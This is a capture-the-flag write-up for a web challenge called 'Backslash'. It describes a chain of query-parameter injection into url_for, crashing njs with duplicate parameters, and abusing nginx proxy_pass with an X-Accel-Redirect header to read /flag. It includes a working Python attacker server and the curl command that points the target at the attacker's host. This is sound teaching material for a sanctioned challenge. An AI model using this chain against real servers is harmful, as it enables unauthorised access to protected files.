# Backslash

- We trick `url_for(request.query_parameters.merge(...)` with params not implemented inside the merge that would overwrite ours. I used `script_name`, so that the variable after parsing would be `http://justcattheimages.s3.eu-central-1.amazonaws.comOURPARAM`.

- Second step was to crash the js, for this, I used a second `url` param. As the doc states ([link](https://nginx.org/en/docs/njs/reference.html#r_args)), if two params are found, the parameter is converted to an array.

- Final step is to use the `proxy_pass`. I found a similar chall writeup ([link](https://github.com/dreadlocked/ctf-writeups/blob/master/midnightsun-ctf/bigspin.md)). We need a redirect with the header `X-Accel-Redirect: /flag`.

```
# server.py
from http.server import SimpleHTTPRequestHandler, HTTPServer

class myHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://nginx:8000/flag')
        self.send_header('X-Accel-Redirect', '/flag')
        self.end_headers()

def run(server_class=HTTPServer, handler_class=myHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd server on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()


# execute
curl "http://bbre.web.jctf.pro/avatar?image=bubu&script_name=.OUR.IP.nip.io:8000/%26url=bubu"

```
